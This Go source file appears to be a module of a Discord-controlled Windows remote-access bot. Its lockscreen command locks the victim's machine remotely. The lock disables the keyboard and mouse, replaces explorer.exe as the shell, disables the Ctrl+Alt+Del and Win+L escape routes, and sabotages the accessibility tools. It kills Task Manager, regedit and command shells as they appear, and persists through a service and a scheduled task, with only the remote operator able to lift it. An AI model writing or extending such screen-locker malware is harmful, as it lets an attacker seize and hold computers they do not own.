//go:build windows

package commands

import (
	"fmt"
	"time"

	"github.com/bwmarrin/discordgo"
	"github.com/local/govoid/internal/win32"
)

func LockScreen(s *discordgo.Session, i *discordgo.InteractionCreate) {
	if err := Defer(s, i); err != nil {
		return
	}

	switch StringOption(i, "action") {
	case "off":
		unlockNow(s, i)
	case "status":
		reportStatus(s, i)
	default:
		lockNow(s, i)
	}
}

func lockNow(s *discordgo.Session, i *discordgo.InteractionCreate) {
	minutes := IntOption(i, "minutes")

	var err error
	if minutes > 0 {
		err = win32.DefaultLock.Start(time.Duration(minutes) * time.Minute)
	} else {
		err = win32.LockDown(ShieldBinary())
	}

	if err != nil {
		Finish(s, i, "⚠️ Candado parcial: "+err.Error())
		return
	}

	if minutes > 0 {
		Finish(s, i, fmt.Sprintf(
			"🔒 Pantalla bloqueada con plazo.\n```\nse libera : %s\n```\nSin capas de persistencia: al vencer vuelve sola.",
			(time.Duration(minutes)*time.Minute).Round(time.Second)))
		return
	}

	Finish(s, i, fmt.Sprintf(
		"🔒 **Bloqueo permanente aplicado.**\n```\n"+
			"teclado     : dispositivo DESHABILITADO en PnP\n"+
			"Ctrl+Alt+Del: no se puede generar (sin teclado)\n"+
			"Win+L       : política DisableLockWorkstation\n"+
			"ratón       : dispositivo DESHABILITADO en PnP\n"+
			"cortina     : %d ventanas topmost (agente + 4 centinelas)\n"+
			"cursor      : oculto\n"+
			"salida      : ninguna local\n"+
			"temporizador: no existe\n"+
			"servicio    : %s (restart 0 ms)\n"+
			"tarea       : %s (cada minuto)\n"+
			"shell       : el agente sustituye a explorer.exe\n"+
			"puertas     : sethc/utilman/osk/narrator/magnify cegadas\n"+
			"escape      : taskmgr, regedit, cmd, powershell, mmc... se matan al aparecer\n"+
			"```\n`/lockscreen action:off` es la única salida. Teclado y ratón vuelven al instante.",
		win32.GuardSlots()+1, win32.ShieldServiceName(), win32.ShieldGuardTaskName()))
}

func unlockNow(s *discordgo.Session, i *discordgo.InteractionCreate) {
	if !win32.LockRequested() && !win32.DefaultLock.Active() {
		Finish(s, i, "ℹ️ La pantalla no estaba bloqueada.")
		return
	}

	if err := win32.UnlockAll(); err != nil {
		Finish(s, i, "⚠️ Liberado con incidencias: "+err.Error())
		return
	}

	Finish(s, i, "🔓 Candado levantado.\n```\ncortina   : retirada\ninput     : restaurado\ncursor    : visible\nservicio  : eliminado\ntarea     : eliminada\nshell     : explorer.exe\npuertas   : restauradas\ncentinelas: terminados\n```")
}

func reportStatus(s *discordgo.Session, i *discordgo.InteractionCreate) {
	locked := win32.LockRequested()
	active := win32.DefaultLock.Active()
	guards := win32.GuardCount()

	switch {
	case locked && active:
		Finish(s, i, fmt.Sprintf(
			"🔒 Bloqueo permanente activo.\n```\nbandera   : presente\ncortina   : arriba\nhardware  : %s\ncentinelas: %d/%d\nservicio  : %s\n```",
			deviceState(win32.InputDevicesDisabled()),
			guards, win32.GuardSlots(), win32.ShieldServiceName()))
	case locked:
		Finish(s, i, "⚠️ Bandera presente pero la cortina de este proceso está caída. Los centinelas deberían cubrirlo.")
	case active:
		Finish(s, i, "🔒 Cortina con plazo activa (sin persistencia).")
	default:
		Finish(s, i, "ℹ️ Pantalla libre.")
	}
}

func deviceState(disabled bool) string {
	if disabled {
		return "teclado y ratón deshabilitados en PnP"
	}
	return "activos (solo hooks y BlockInput)"
}

func LockOn(s *discordgo.Session, i *discordgo.InteractionCreate) {
	if err := Defer(s, i); err != nil {
		return
	}
	if win32.DefaultLock.Active() || win32.LockRequested() {
		Finish(s, i, "ℹ️ Ya está bloqueada.")
		return
	}
	lockNow(s, i)
}

func LockOff(s *discordgo.Session, i *discordgo.InteractionCreate) {
	if err := Defer(s, i); err != nil {
		return
	}
	unlockNow(s, i)
}

func EnsureUnlocked() {
	if win32.LockRequested() || win32.DefaultLock.Active() {
		_ = win32.UnlockAll()
	}
}
